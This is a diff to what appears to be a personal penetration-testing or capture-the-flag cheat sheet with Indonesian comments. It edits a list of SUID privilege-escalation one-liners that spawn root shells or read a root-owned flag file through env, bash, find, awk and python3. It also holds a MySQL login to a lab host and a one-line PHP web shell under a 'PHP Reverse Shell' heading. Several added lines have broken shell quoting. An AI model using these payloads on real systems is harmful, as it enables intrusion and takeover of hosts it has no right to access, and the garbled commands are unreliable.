@@ -20,12 +20,13 @@ MySQL
 mysql -h 192.168.56.102 -u klaimku_app -p klaimku --skip-ssl
 
 Priv Esc
-/usr/bin/find /root -iname FLAG.txt -exec cat {} %2b
-./binary -p ...                              # -p mempertahankan euid
-env /bin/sh -p                               # SUID env
+
+/usr/local/bin/env /bin/bash -p -c 'id'"     # SUID env
 bash -p                                      # SUID bash
-find . -exec /bin/sh -p \; -quit             # SUID find
-awk 'BEGIN{system("/bin/sh")}'               # SUID awk (mawk)
+/usr/bin/find /root -iname FLAG.txt -exec cat {} %2b
+/usr/bin/find /root -iname flag.txt          # SUID find
+sudo /usr/bin/gawk 'BEGIN{system("id")}'     # SUID awk (mawk)
+cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; whoami")'\''' \   #python3.13
 
 PHP Reverse Shell
 <?php system($_GET['cmd']); ?>
